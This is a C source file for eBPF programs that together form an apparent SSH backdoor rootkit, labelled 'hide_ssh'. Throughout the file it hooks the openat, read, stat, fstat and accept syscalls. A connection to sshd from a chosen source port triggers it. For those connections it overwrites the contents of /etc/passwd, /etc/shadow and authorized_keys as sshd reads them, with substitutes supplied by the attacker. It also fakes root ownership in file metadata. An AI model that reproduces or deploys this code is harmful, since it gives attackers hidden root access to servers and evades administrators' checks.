#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>

#include "inputs.bpf.h"

#define logprefix "hide_ssh: "
#define bpf_printk(fmt, ...)                            \
({                                                      \
        char ____fmt[] = logprefix fmt;                 \
        bpf_trace_printk(____fmt, sizeof(____fmt),      \
                         ##__VA_ARGS__);                \
})

#define AUTHORIZED_KEYS 1
#define PASSWD 2
#define SHADOW 3

#define filename_len_max 128

/*
    Overwritting struct elem
*/

struct elem {
    int pid;
    int fd;
    unsigned long buff;
    int buff_len;
    int file_type;
    struct stat *stat;
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, int); // pid_tgid
    __type(value, struct elem); // elem
} pid_elem SEC(".maps");

/*
    stat() struct pointer holder
*/
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, int); // pid_tgid
    __type(value, long unsigned int); // struct stat
} path_stats SEC(".maps");


/*
    Port Trigger
*/

struct accept_args {
    struct sockaddr_in *addr;
    int *ttl;
    int *backdoor_type;
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4);
    __type(key, int); // simple key (Arbitrary 0)
    __type(value, struct accept_args); // struct accept_args
} backdoor_trigger SEC(".maps");


SEC("tp/syscalls/sys_enter_openat")
int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
{
    int file_type = 0;
    int tgid = bpf_get_current_pid_tgid();
    int pid = bpf_get_current_pid_tgid() >> 32;
    char comm[10];
    bpf_get_current_comm(&comm, 10);
    
    if (comm[0] != 's' || comm[1] != 's' || comm[2] != 'h' || comm[3] != 'd') {
        return 0;
    }

    const int key = 0;
    int *port_triggered = bpf_map_lookup_elem(&backdoor_trigger, &key);
    if (port_triggered == 0) {
        return 0;
    }

    char check_filename[filename_len_max];
    bpf_probe_read(&check_filename, filename_len_max, (char*)ctx->args[1]);



    int is_passwd = 1;
    /* passwd */
    const char passwd[] = "/etc/passwd";
    for (int i = 0; i < 11; i++) {
        if (passwd[i] != check_filename[i]) {
            is_passwd = 0;
            break;
        }
    }
    if (is_passwd == 1) {
        file_type = PASSWD;
    }

    int is_shadow = 1;
    /* shadow */
    const char shadow[] = "/etc/shadow";
    for (int i = 0; i < 11; i++) {
        if (shadow[i] != check_filename[i]) {
            is_shadow = 0;
            break;
        }
    }
    if (is_shadow == 1) {
        file_type = SHADOW;
    }

    int is_auth_key = 0;
    if (file_type == 0) {
        /* Auth_keys file */
        int checking_auth_file = 0;   
        for (int i = 0; i < filename_len_max; i++) {
            if (checking_auth_file == 1) {
                if (i+14 > filename_len_max) {
                    break;
                }
                if (check_filename[i] == 'a' && check_filename[i+1] == 'u' && check_filename[i+2] == 't' && check_filename[i+3] == 'h' && check_filename[i+4] == 'o' && check_filename[i+5] == 'r' && check_filename[i+6] == 'i' && check_filename[i+7] == 'z' && check_filename[i+8] == 'e' && check_filename[i+9] == 'd' && check_filename[i+10] == '_' && check_filename[i+11] == 'k' && check_filename[i+12] == 'e' && check_filename[i+13] == 'y' && check_filename[i+14] == 's' && check_filename[i+15] == 0) {
                    is_auth_key = 1;
                    break;
                } else {
                    checking_auth_file = 0;
                }
            }
            if (check_filename[i] == '/') {
                checking_auth_file = 1;
            }
            // if null byte
            if (check_filename[i] == 0) {
                break;
            }
        }
    }
    
    if (is_auth_key == 1) {
        file_type = AUTHORIZED_KEYS;
    }

    if (file_type == 0) { // not passwd or auth_keys
        return 0;
    }

    struct elem value = {
        .pid = pid,
        .fd = ctx->args[0],
        .buff = 0,
        .buff_len = 0,
        .file_type = file_type,
        .stat = 0
    };
    bpf_map_update_elem(&pid_elem, &tgid, &value, 0);
    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int openat_exitpoint(struct trace_event_raw_sys_exit *ctx)
{
    const int trigger_key = 0;
    int tgid = bpf_get_current_pid_tgid();
    struct elem *fd = bpf_map_lookup_elem(&pid_elem, &tgid);
    if (fd == 0) {
        return 0;
    }
    struct elem *e = fd;
    e->fd = ctx->ret;

    if (ctx->ret < 0) {
        bpf_map_delete_elem(&pid_elem, &tgid);
        bpf_map_delete_elem(&backdoor_trigger, &trigger_key);
        return 0;
    }
    return 0;
}

SEC("tp/syscalls/sys_enter_close")
int close_entrypoint(struct trace_event_raw_sys_enter *ctx)
{
    int tgid = bpf_get_current_pid_tgid();
    struct elem *e = bpf_map_lookup_elem(&pid_elem, &tgid);
    if (e == 0) {
        return 0;
    }
    if (e->fd == ctx->args[0]) {
        bpf_map_delete_elem(&pid_elem, &tgid);
    }
    return 0;
}


SEC("tp/syscalls/sys_enter_newfstat")
int fstat_entrypoint(struct trace_event_raw_sys_enter *ctx)
{
    int tgid = bpf_get_current_pid_tgid();
    struct elem *e = bpf_map_lookup_elem(&pid_elem, &tgid);
    if (e == 0) {
        return 0;
    }
    if (e->file_type == AUTHORIZED_KEYS && ctx->args[0] == e->fd) {
        e->stat = (struct stat *)ctx->args[1];
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_newfstat")
int fstat_exitpoint(struct trace_event_raw_sys_exit *ctx)
{
    int tgid = bpf_get_current_pid_tgid();
    struct elem *e = bpf_map_lookup_elem(&pid_elem, &tgid);
    if (e == 0) {
        return 0;
    }
    if (e->file_type == AUTHORIZED_KEYS && e->stat != 0) {
        struct stat stat;
        bpf_probe_read(&stat, sizeof(struct stat), e->stat);
        // Overwrite st_uid and st_gid
        stat.st_uid = 0;
        stat.st_gid = 0;
        bpf_probe_write_user(e->stat, (void*)&stat, sizeof(struct stat));
        // bpf_printk("OVERWRITTEN AUTHORIZED_KEYS STATS\n");
    }
    return 0;
}

// Folder stat
SEC("tp/syscalls/sys_enter_newstat")
int newstat_entrypoint(struct trace_event_raw_sys_enter *ctx)
{
    int tgid = bpf_get_current_pid_tgid();
    const int key = 0;
    int *port_triggered = bpf_map_lookup_elem(&backdoor_trigger, &key);
    if (port_triggered == 0) { // not actively triggered
        return 0;
    }
    // am i sshd?
    char comm[10];
    bpf_get_current_comm(&comm, 10);
    if (comm[0] != 's' || comm[1] != 's' || comm[2] != 'h' || comm[3] != 'd') {
        return 0;
    }

    // check if it's part of /home
    char check_filename[filename_len_max];
    bpf_probe_read(&check_filename, filename_len_max, (char*)ctx->args[0]);
    if (check_filename[0] != '/' || check_filename[1] != 'h' || check_filename[2] != 'o' || check_filename[3] != 'm' || check_filename[4] != 'e') {
        return 0;
    }
    struct stat *statptr = (struct stat *)ctx->args[1];
    bpf_map_update_elem(&path_stats, &tgid, &statptr, 0);
    return 0;
}

SEC("tp/syscalls/sys_exit_newstat")
int newstat_exitpoint(struct trace_event_raw_sys_exit *ctx)
{
    int tgid = bpf_get_current_pid_tgid();
    long unsigned int *stat_struct = bpf_map_lookup_elem(&path_stats, &tgid);
    if (stat_struct == 0) {
        return 0;
    }
    struct stat *stat_addr = *stat_struct;
    struct stat stat;
    bpf_probe_read(&stat, sizeof(struct stat), stat_addr);
    // Overwrite st_uid and st_gid
    stat.st_uid = 0;
    stat.st_gid = 0;
    bpf_probe_write_user(stat_addr, (void*)&stat, sizeof(struct stat));
    bpf_map_delete_elem(&path_stats, &tgid);
}


SEC("tp/syscalls/sys_enter_read")
int read_entrypoint(struct trace_event_raw_sys_enter *ctx)
{
    int tgid = bpf_get_current_pid_tgid();
    struct elem *e = bpf_map_lookup_elem(&pid_elem, &tgid);
    if (e == 0) {
        return 0;
    }
    if (e->fd != ctx->args[0]) {
        return 0;
    }
    e->buff = ctx->args[1];
    e->buff_len = ctx->args[2];
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
{
    const int zero = 0;
    int tgid = bpf_get_current_pid_tgid();
    if (ctx->ret < 0) {
        return 0;
    }

    struct elem *e = bpf_map_lookup_elem(&pid_elem, &tgid);
    if (e == 0) {
        return 0;
    }

    struct accept_args *args = bpf_map_lookup_elem(&backdoor_trigger, &zero);
    if (args == 0) {
        return 0;
    }
    int ttl = args->ttl;
    int file_type = e->file_type;


    if (file_type == AUTHORIZED_KEYS && args->backdoor_type == AUTH_BACKDOOR)
    {
        char *auth_key = bpf_map_lookup_elem(&auth_elem, &zero);
        if (auth_key == 0) {
            return 0; // You should not be here
        }
        char* overwritten_content = auth_key;
        int overwritten_content_len = 0;
        for (int i = 0; i < 256; i++) { // TODO: Get it from userspace
            if (overwritten_content[i] == 0) {
                overwritten_content_len = i;
                break;
            }
        }
        overwritten_content_len += 1;

        // check if original auth_key file is large enough for our privkey
        if (overwritten_content_len > ctx->ret) {
            bpf_map_delete_elem(&pid_elem, &tgid);
            bpf_map_delete_elem(&backdoor_trigger, &zero);
            return 0;
        }

        if (overwritten_content_len > 0 && overwritten_content_len < 256) {
            bpf_probe_write_user((void*)e->buff, (void*) overwritten_content, overwritten_content_len);
            // bpf_printk("OVERWRITTEN AUTHORIZED_KEYS");
        }
    }

    // We are giving UID 0 no matter what's the backdoor type
    if (file_type == PASSWD || file_type == SHADOW)
    {
        int one = 1;
        struct file_block *file;
        if (file_type == PASSWD) {
            file = bpf_map_lookup_elem(&files_elem, &zero);
        } else {
            file = bpf_map_lookup_elem(&files_elem, &one);
        }

        if (file == 0) {
            return 0; // You should not be here
        }
        if (ctx->ret > 0 && ctx->ret <= sizeof(file->buff)) {
            // bpf_printk("OVERWRITTEN PASSWD/SHADOW");
            bpf_probe_write_user((void*)e->buff, (void*) file->buff, ctx->ret);
        }
    }

    bpf_map_delete_elem(&pid_elem, &tgid);
    if (ttl == 1) {
        bpf_map_delete_elem(&backdoor_trigger, &zero);
    } else {
        args->ttl = ttl-1;
    }
    return 0;
}

/*
    Trigger UID from tcp src port
*/

SEC("tp/syscalls/sys_enter_accept")
int accept_entrypoint(struct trace_event_raw_sys_enter *ctx)
{
    char comm[10];
    bpf_get_current_comm(&comm, 10);
    if (comm[0] != 's' || comm[1] != 's' || comm[2] != 'h' || comm[3] != 'd') {
        return 0;
    }
    struct sockaddr_in * addr = (struct sockaddr_in *)ctx->args[1];
    struct accept_args args = {
        .addr = addr,
        .ttl = 10, // doing a little hack
        .backdoor_type = 0
    };
    const int key = 0;
    bpf_map_update_elem(&backdoor_trigger, &key, &args, 0);
    return 0;
}

SEC("tp/syscalls/sys_exit_accept")
int accept_exitpoint(struct trace_event_raw_sys_exit *ctx)
{
    char comm[10];
    bpf_get_current_comm(&comm, 10);
    if (comm[0] != 's' || comm[1] != 's' || comm[2] != 'h' || comm[3] != 'd') {
        return 0;
    }
    const int key = 0;
    struct accept_args *args = bpf_map_lookup_elem(&backdoor_trigger, &key);
    if (args == 0) {
        return 0;
    }
    struct sockaddr_in read = {
        .sin_family = 0,
        .sin_port = 0,
        .sin_addr = 0
    };
    bpf_probe_read(&read, sizeof(struct sockaddr_in), args->addr);
    unsigned short port = __bpf_ntohs(read.sin_port);
    
    int *bk_type = bpf_map_lookup_elem(&trigger_ports, &port);
    if (bk_type == 0) {
        bpf_map_delete_elem(&backdoor_trigger, &key);
        return 0;
    }
    if (*bk_type > 0 && *bk_type < 3) {
        args->backdoor_type = *bk_type;
    }
    return 0;
}

char LICENSE[] SEC("license") = "GPL";